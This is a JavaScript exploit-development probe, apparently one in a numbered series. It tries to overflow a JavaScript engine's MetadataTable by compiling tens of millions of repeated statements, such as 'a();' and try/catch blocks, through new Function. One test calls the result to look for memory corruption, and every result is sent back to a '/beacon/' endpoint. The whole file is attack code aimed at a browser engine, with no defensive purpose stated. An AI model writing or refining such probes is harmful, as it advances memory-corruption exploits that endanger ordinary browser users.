// p134 — MetadataTable overflow with denser opcodes
// Goal: maximize metadata bytes per source byte to reach overflow under 80MB string limit
//
// p124 R6: 20M repeats (80MB) of 'a();' compiled OK
// p129 F1: 22M repeats (88MB) CRASHED/OOM'd
// We need ~38-45M metadata entries to overflow unsigned
// At 'a();' = 4 bytes/3 opcodes = ~1.33 bytes/opcode
// We need ~128MB metadata for overflow at ~96 bytes avg per triplet
//
// BETTER OPCODE: try/catch/finally generates ~8+ metadata entries per ~30 bytes
// switch/case generates metadata per case
// for-in generates metadata entries per iteration setup
//
// Strategy: find the most metadata-dense pattern that compiles under 80MB
//
// Beacon prefix: V134D-
(function(){
var rid='v134d'+Math.random().toString(36).slice(2,12);
function beacon(tag,data){
  var body=typeof data==='object'?JSON.stringify(data):String(data);
  try{navigator.sendBeacon('/beacon/V134D-'+tag,JSON.stringify({r:rid,b:body}));}catch(e){}
  try{fetch('/beacon/V134D-'+tag,{method:'POST',body:JSON.stringify({r:rid,b:body}),keepalive:true}).catch(function(){});}catch(e2){}
}
beacon('L','probe134-start');

// ======== D1: Measure 'a();' compile at exactly 20M (baseline) ========
function testD1(){
  var r={n:20000000};
  var t0=Date.now();
  try{
    var src='a();'.repeat(20000000);
    r.srcLen=src.length;
    r.srcTime=Date.now()-t0;
    var t1=Date.now();
    var fn=new Function('a',src);
    r.compileTime=Date.now()-t1;
    r.compiled=true;
    src=null;fn=null;
  }catch(e){
    r.err=e.constructor.name+':'+String(e.message||'').slice(0,80);
  }
  r.totalTime=Date.now()-t0;
  return r;
}

// ======== D2: try{a();}catch(e){} — denser metadata ========
// 'try{a();}catch(e){}' = 20 chars, generates try_enter + try_exit + catch metadata
function testD2(){
  var r={};
  var t0=Date.now();
  try{
    var unit='try{a();}catch(e){}'; // 19 chars
    var n=Math.floor(75000000/unit.length); // ~3.9M repeats for ~75MB
    r.n=n;
    r.estSize=n*unit.length;
    var src=unit.repeat(n);
    r.srcLen=src.length;
    r.srcTime=Date.now()-t0;
    var t1=Date.now();
    var fn=new Function('a',src);
    r.compileTime=Date.now()-t1;
    r.compiled=true;
    src=null;fn=null;
  }catch(e){
    r.err=e.constructor.name+':'+String(e.message||'').slice(0,80);
  }
  r.totalTime=Date.now()-t0;
  return r;
}

// ======== D3: 'a(b);' — call with argument, generates more metadata ========
function testD3(){
  var r={};
  var t0=Date.now();
  try{
    var n=15000000; // 75MB at 5 chars each
    var src='a(b);'.repeat(n);
    r.n=n;
    r.srcLen=src.length;
    r.srcTime=Date.now()-t0;
    var t1=Date.now();
    var fn=new Function('a','b',src);
    r.compileTime=Date.now()-t1;
    r.compiled=true;
    src=null;fn=null;
  }catch(e){
    r.err=e.constructor.name+':'+String(e.message||'').slice(0,80);
  }
  r.totalTime=Date.now()-t0;
  return r;
}

// ======== D4: 'a[0]=0;' — put_by_val, different metadata struct ========
function testD4(){
  var r={};
  var t0=Date.now();
  try{
    var n=10000000; // 70MB at 7 chars each
    var src='a[0]=0;'.repeat(n);
    r.n=n;
    r.srcLen=src.length;
    r.srcTime=Date.now()-t0;
    var t1=Date.now();
    var fn=new Function('a',src);
    r.compileTime=Date.now()-t1;
    r.compiled=true;
    src=null;fn=null;
  }catch(e){
    r.err=e.constructor.name+':'+String(e.message||'').slice(0,80);
  }
  r.totalTime=Date.now()-t0;
  return r;
}

// ======== D5: Maximum repeat at 80MB — push the limit ========
function testD5(){
  var r={};
  var t0=Date.now();
  try{
    var n=20000000; // exact p124 R6 number, 80MB
    r.n=n;
    var src='a();'.repeat(n);
    r.srcLen=src.length;
    r.srcTime=Date.now()-t0;
    var t1=Date.now();
    // Call the function to trigger metadata linking
    var fn=new Function('a',src);
    r.compileTime=Date.now()-t1;
    r.compiled=true;

    // Now try calling — this triggers full bytecode linking including metadata
    var callCount=0;
    try{
      fn(function(){
        callCount++;
        if(callCount>3) throw new Error('STOP');
      });
    }catch(e){
      if(e.message==='STOP'){
        r.callsOK=true;
      }else{
        r.callErr=e.constructor.name+':'+String(e.message||'').slice(0,60);
        r.callErrCorruption=(e.constructor.name!=='Error');
      }
    }
    r.callCount=callCount;
    src=null;fn=null;
  }catch(e){
    r.err=e.constructor.name+':'+String(e.message||'').slice(0,80);
  }
  r.totalTime=Date.now()-t0;
  return r;
}

// ======== Run all ========
async function runAll(){
  var tests=[
    {name:'D1-BASELINE-20M',fn:testD1},
    {name:'D2-TRYCATCH',fn:testD2},
    {name:'D3-CALL-ARG',fn:testD3},
    {name:'D4-PUTBYVAL',fn:testD4},
    {name:'D5-CALL-20M',fn:testD5}
  ];
  for(var t=0;t<tests.length;t++){
    beacon(tests[t].name+'-PRE','starting');
    try{
      var result=tests[t].fn();
      beacon(tests[t].name,result||{});
    }catch(e){
      beacon(tests[t].name,{fatal:e.constructor.name+':'+String(e.message||'').slice(0,80)});
    }
    // GC between tests
    for(var g=0;g<20;g++){var tmp=new ArrayBuffer(4194304);tmp=null;}
    await new Promise(function(resolve){setTimeout(resolve,3000);});
    for(var g2=0;g2<20;g2++){var tmp2=new ArrayBuffer(4194304);tmp2=null;}
  }
  beacon('DONE','all-'+tests.length);
}
runAll();
})();
